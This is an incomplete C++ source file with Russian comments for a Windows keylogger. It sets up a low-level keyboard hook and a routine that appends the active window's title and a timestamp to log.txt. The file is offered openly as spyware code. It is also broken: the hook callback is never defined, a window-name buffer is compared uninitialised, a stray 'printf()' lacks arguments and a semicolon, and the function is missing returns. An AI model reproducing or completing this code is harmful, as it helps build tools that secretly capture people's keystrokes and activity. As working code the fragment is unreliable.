#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>
// #include <cstring>
// #include <cwchar>

using namespace std;

int Save(int key);

// Функция обратного вызова. Срабатывает при нажатии
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

// GLOBAL VARIABLES
HHOOK hook; // Перехват вызова функций

// Структура для определения кнопки
KBDLLHOOKSTRUCT kbStruct;

ofstream file;

int Save(int key)
{
    // Имя предыдущего окна
    wchar_t prevProgName[256];

    if (key == 1 || key == 2)
    {
        return 0;
    }

    // Получение активного окна
    HWND hwnd = GetForegroundWindow();

    // id процесса
    DWORD pid;
    // Раскладка клавиатуры
    HKL kbLayout;

    // Если есть активное окно
    if (hwnd)
    {
        pid = GetWindowThreadProcessId(hwnd, NULL);
        kbLayout = GetKeyboardLayout(pid);

        // Заголовок окна
        wchar_t currProgName[256];
        GetWindowTextW(hwnd, currProgName, 256);

        // Сравниваем заголовки программ
        if (wcscmp(currProgName, prevProgName) != 0)
        {
            wcscpy(prevProgName, currProgName); // FIXME: возможно нужно поменять местами

            // Получение настоящего времени
            time_t t = time(NULL);         // Время в секундах
            struct tm *tm = localtime(&t); // Преобразование числа в структуру tm
            char dateTime[64];             // Время и дата
            strftime(dateTime, sizeof(dateTime), "%c", tm);

            // Запись в файл информации о времени и имени новой программы
            file.open("log.txt", ios::app | ios::out);
            file << "[Program: \"" << currProgName << "\" - " << dateTime << "]\n";
            file.close();
            printf()
        }
    }
}